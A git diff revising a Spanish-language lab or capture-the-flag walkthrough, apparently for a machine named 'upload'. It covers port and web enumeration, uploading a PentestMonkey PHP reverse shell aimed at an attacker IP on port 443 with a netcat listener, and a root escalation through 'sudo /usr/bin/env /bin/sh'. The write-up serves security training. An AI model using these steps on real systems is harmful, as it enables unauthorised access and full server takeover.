@@ -1,6 +1,8 @@
-## 1. Reconocimiento Inicial con Nmap
+## 1. Reconocimiento y Enumeración Inicial
 
-Realizamos un escaneo exhaustivo con `nmap` para detectar puertos abiertos, sus versiones y el sistema operativo. Esto nos proporciona una visión general de los servicios expuestos y posibles vulnerabilidades asociadas a sus versiones.
+### 1.1. Escaneo con Nmap
+
+Iniciamos la auditoría realizando un escaneo de puertos y servicios para identificar la superficie de ataque del servidor objetivo.
 
 ```bash
 nmap -O -sC -sV <IP_DEL_OBJETIVO>
@@ -11,16 +13,15 @@ nmap -O -sC -sV <IP_DEL_OBJETIVO>
 *   `80/tcp open http Apache` El título de la página (`Upload here your file`) es una pista clara sobre la funcionalidad principal del sitio.
 
 ![[Upload_SubirArchivo.png]]
-### 1.2. Análisis de la Página Web con WhatWeb
+### 1.2. Perfilado Tecnológico (WhatWeb)
 
-Utilizamos `whatweb` para obtener más información sobre la tecnología utilizada en la página web. Esta herramienta escaneará la URL y reportará tecnologías, versiones y otros detalles.
+Para obtener mayor detalle sobre el entorno, ejecutamos `whatweb`.
 
-```bash
-whatweb <IP_DEL_OBJETIVO>
+```Bash
+whatweb http://<IP_DEL_OBJETIVO>
 ```
 
-**Resultado:**
-*   `Apache/2.4.52` en `Ubuntu Linux`.
+- **Resultado:** Confirma el uso de Apache/2.4.52 corriendo sobre un sistema operativo Ubuntu Linux.
 
 ### 1.3. Fuzzing Web con Gobuster
 
@@ -33,100 +34,84 @@ gobuster dir -w /path/to/wordlist/directory-list-lowercase-2.3-medium.txt -u htt
 **Resultados Relevantes:**
 
 *   `/uploads`: Este directorio es crucial, ya que su nombre sugiere que es donde se almacenan los archivos subidos.
+
 ## 2. Explotación de la Vulnerabilidad de Carga de Archivos
 
 La presencia de una funcionalidad de carga de archivos y un directorio `/uploads` accesible es una señal de una posible vulnerabilidad de carga de archivos sin restricciones, que puede llevar a la ejecución remota de código (RCE).
 
-### 2.1. Creación de una Reverse Shell en PHP
+### 2.1. Preparación del Payload (Reverse Shell)
 
-Para obtener una shell inversa, crearemos un archivo PHP que, al ser ejecutado en el servidor, se conectará a nuestra máquina atacante. Utilizaremos un script de reverse shell PHP estándar, como el de `pentestmonkey`.
+Dado que el servidor ejecuta PHP, preparamos un script malicioso en este lenguaje (como la Reverse Shell de PentestMonkey). Modificamos los parámetros internos del script para que apunten a nuestra máquina atacante:
+- `$ip = '<IP_ATACANTE>'`
+- `$port = 443`
+Guardamos el archivo como `reverseShell.php`.
 
-Descargar el script y modificar la dirección IP (`$ip`) a la IP de tu máquina atacante (Kali Linux) y el puerto (`$port`) al puerto que usarás para escuchar la conexión (por ejemplo, 443).
+### 2.2. Subida y Ejecución
 
-### 2.2. Carga del Archivo Malicioso
+1. Accedemos a la interfaz principal y subimos el archivo reverseShell.php. La aplicación confirma la recepción con el mensaje: _"The file reverseShell.php has been uploaded"_. Esto confirma la ausencia de filtros restrictivos.
 
-Utilizamos la interfaz de carga de archivos en `http://<IP_DEL_OBJETIVO>/` para subir nuestro `reverseShell.php` modificado. Si la carga es exitosa, el servidor responderá con un mensaje de confirmación como `The file reverseShell.php has been uploaded.`
+2. En nuestra máquina atacante, preparamos un _listener_ en el puerto definido:
 
-### 2.3. Obtención de la Reverse Shell
+```Bash
+nc -nlvp 443
+```
+  
+3. Navegamos hacia el directorio descubierto anteriormente para ejecutar el script: `http://<IP_DEL_OBJETIVO>/uploads/reverseShell.php`
 
-1.  **Configurar el Listener:** En tu máquina atacante (Kali Linux), abre una terminal y configura un `netcat` listener en el puerto que especificaste en el script PHP (por ejemplo, 443).
+### 2.3. Acceso Inicial y Estabilización (TTY)
 
-    ```bash
-    nc -lvnp 443
-    ```
+Al invocar la URL, el servidor interpreta el código PHP y nos devuelve una conexión interactiva (_Reverse Shell_).
 
-2.  **Ejecutar el Archivo Cargado:** Navega en tu navegador a la URL donde se cargó el archivo PHP: `http://<IP_DEL_OBJETIVO>/uploads/reverseShell.php`. Al acceder a esta URL, el servidor ejecutará el script PHP, lo que activará la conexión inversa a tu listener de `netcat`.
-
-Deberías ver una conexión entrante en tu terminal de `netcat`.
-
-```bash
+```Bash
 whoami
-www-data
+# www-data
 ```
 
-Confirmamos que hemos obtenido una shell como el usuario `www-data`, que es el usuario bajo el que se ejecuta el servidor web Apache.
+Para asegurar la persistencia y comodidad de la sesión (evitando que se cierre accidentalmente con atajos de teclado y habilitando el autocompletado), realizamos el tratamiento de la TTY:
 
-### 2.4. Tratamiento de la TTY (Opcional pero Recomendado)
-
-Para una mejor interacción con la shell (autocompletado, historial, etc.), es recomendable convertirla en una TTY (terminal) interactiva. Esto se logra con los siguientes comandos:
-
-1.  **Ejecutar `script`:**
-    ```bash
-    script /dev/null -c bash
-    ```
-2.  **Suspender el proceso:**
-    ```bash
-    Ctrl + Z
-    ```
-3.  **Configurar la terminal:**
-    ```bash
-    stty raw -echo; fg
-    ```
-4.  **Restablecer la terminal:**
-    ```bash
-    reset
-    ```
-5.  **Especificar tipo de terminal (si se pregunta):**
-    ```bash
-    xterm
-    ```
-6.  **Exportar variables de entorno:**
-    ```bash
-    export TERM=xterm
-    export SHELL=bash
-    ```
+```Bash
+script /dev/null -c bash
+# [Ctrl + Z] para suspender
+stty raw -echo; fg
+reset
+export TERM=xterm
+export SHELL=bash
+```
 
 ## 3. Escalada de Privilegios
 
 Una vez que tenemos una shell como `www-data`, el objetivo es escalar privilegios a `root`.
 
-### 3.1. Verificación de Permisos Sudo
+### 3.1. Enumeración de Sudoers
 
-Verificamos qué comandos puede ejecutar el usuario actual con `sudo` sin necesidad de contraseña. Esto se hace con el comando `sudo -l`.
+Revisamos las políticas de ejecución privilegiada asignadas a nuestro usuario:
 
-```bash
+```Bash
 sudo -l
 ```
 
-**Resultados Clave:**
+**Resultado:**
 
-*   `(root) NOPASSWD: /usr/bin/env`
-
-Esto significa que el usuario `www-data` puede ejecutar el binario `/usr/bin/env` como `root` sin necesidad de introducir su contraseña. El comando `env` se utiliza para ejecutar un programa en un entorno modificado, y puede ser abusado para escalar privilegios si está mal configurado en `sudo`.
-
-### 3.2. Abuso de `env` para Obtener Root
-
-Según GTFOBins, cuando `env` tiene permisos `NOPASSWD` en `sudo`, se puede abusar de él para ejecutar una shell con privilegios de `root`.
-
-```bash
-sudo -u root /usr/bin/env /bin/sh
+```
+User www-data may run the following commands on upload:
+    (root) NOPASSWD: /usr/bin/env
 ```
 
-Al ejecutar este comando, obtendremos una shell con privilegios de `root`.
+### 3.2. Abuso de env
 
-```bash
+El sistema está mal configurado, permitiendo al usuario `www-data` ejecutar el binario `/usr/bin/env` como `root` sin requerir contraseña.
+
+**Análisis de la Vulnerabilidad:** El comando `env` se utiliza para ejecutar un programa en un entorno modificado. Usando **GTFOBins**, comprobamos que, si `env` puede ser invocado mediante `sudo`, es posible utilizarlo para lanzar un intérprete de comandos (`/bin/sh` o `/bin/bash`). Como el contexto de ejecución original pertenece a `sudo`, la nueva shell heredará los privilegios del superusuario.
+
+**Ejecución del Exploit:** Lanzamos una shell interactiva a través de `env`:
+
+```Bash
+sudo /usr/bin/env /bin/sh
+```
+
+Verificamos el compromiso total del sistema:
+
+```Bash
 whoami
 # root
 ```
-
-Confirmamos que hemos escalado exitosamente a `root`.
